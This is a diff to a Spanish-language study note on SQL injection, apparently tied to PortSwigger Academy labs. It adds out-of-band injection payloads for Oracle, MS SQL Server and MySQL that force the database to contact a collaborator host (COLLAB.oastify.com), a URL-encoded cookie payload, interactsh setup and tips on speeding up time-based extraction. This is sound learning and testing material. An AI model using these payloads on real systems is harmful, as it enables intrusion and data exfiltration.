@@ -86,6 +86,36 @@ sqlmap -u "http://target.com/products?id=1" --technique=T --time-sec=5 --batch
 
 > **Nota operacional — paralelismo en time-based**: la extraccion bit-a-bit con time-based es paralelizable trivialmente (cada `(posicion, candidato)` es independiente). Burp Suite **Community** limita a 1 thread, lo que para 20 chars × 36 candidatos = 720 requests con `pg_sleep(5)` da ~6 minutos. Un script Python con `requests + concurrent.futures.ThreadPoolExecutor` (10 workers) baja eso a ~1 minuto al saturar el pool de conexiones de la DB. El cuello de botella deja de ser el cliente y pasa a ser cuantas conexiones concurrentes acepta la DB para los `pg_sleep`. Ver writeup `learning/portswigger/blind-sqli-time-delays-info-retrieval/` para implementacion completa.
 
+```sql
+-- Out-of-Band SQLi (OAST): cuando la query es async y no afecta ni body ni tiempo.
+-- Forzar conexion saliente desde la DB hacia un dominio que controlamos.
+-- Receptor: Burp Collaborator (*.oastify.com, Pro), interactsh (*.oast.me, gratis), DNSLog.
+
+-- OOB Oracle - XXE via xmltype (la primitiva mas usada, sin permisos especiales)
+' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--
+
+-- OOB Oracle - alternativas si XXE bloqueado (requieren permisos sobre packages)
+'||(SELECT UTL_HTTP.REQUEST('http://COLLAB.oastify.com') FROM dual)||'
+'||UTL_INADDR.GET_HOST_ADDRESS('COLLAB.oastify.com')||'
+
+-- OOB MS SQL Server (UNC path -> SMB/NetBIOS lookup desde el host de la DB)
+'; EXEC master..xp_dirtree '\\COLLAB.oastify.com\share'--
+
+-- OOB MySQL Windows (requiere privilegio FILE; no funciona en Linux)
+' UNION SELECT LOAD_FILE('\\\\COLLAB.oastify.com\\share')--
+```
+
+```bash
+# URL-encodeado para meter en cookie TrackingId (ejemplo Oracle XXE):
+# TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLAB.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+# Levantar interactsh-client como receptor OAST gratuito
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+interactsh-client    # imprime el subdominio único asignado, ej. xxxxx.oast.me
+```
+
+> **Nota operacional — allowlists OAST**: PortSwigger Academy bloquea outbound hacia cualquier dominio distinto de `*.oastify.com` (Burp Collaborator). Sin Burp Pro los labs OOB de la Academy no son resolubles via interactsh/DNSLog. En pentests reales o bug bounty no suele haber esa restricción y interactsh es suficiente. Verificar restricciones del target antes de invertir tiempo en debug — si el firewall corta la salida, ningún payload funcionará. Ver writeup `learning/portswigger/blind-sqli-out-of-band/` para diagnóstico completo del caso.
+
 ## Contramedidas
 - Uso de consultas preparadas (Prepared Statements) con parametrización.
 - Implementación de una lista blanca (Allow-list) para la validación de entradas.
@@ -97,3 +127,5 @@ sqlmap -u "http://target.com/products?id=1" --technique=T --time-sec=5 --batch
 - MITRE Corporation. (2024). ATT&CK Technique T1190: Exploit Public-Facing Application. https://attack.mitre.org/techniques/T1190/
 - Writeup propio: [`learning/portswigger/visible-error-based-sql-injection/writeup.md`](../../../learning/portswigger/visible-error-based-sql-injection/writeup.md) — ejemplo end-to-end del CAST PostgreSQL.
 - Writeup propio: [`learning/portswigger/blind-sqli-time-delays/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays/writeup.md) — ejemplo end-to-end de time-based con `pg_sleep` (stacked queries en cookie, `;` URL-encoded como `%3B`).
+- Writeup propio: [`learning/portswigger/blind-sqli-time-delays-info-retrieval/writeup.md`](../../../learning/portswigger/blind-sqli-time-delays-info-retrieval/writeup.md) — extracción carácter a carácter con script Python paralelizado.
+- Writeup propio: [`learning/portswigger/blind-sqli-out-of-band/writeup.md`](../../../learning/portswigger/blind-sqli-out-of-band/writeup.md) — OOB Oracle XXE via `xmltype` + diagnóstico de allowlist OAST en PortSwigger Academy.
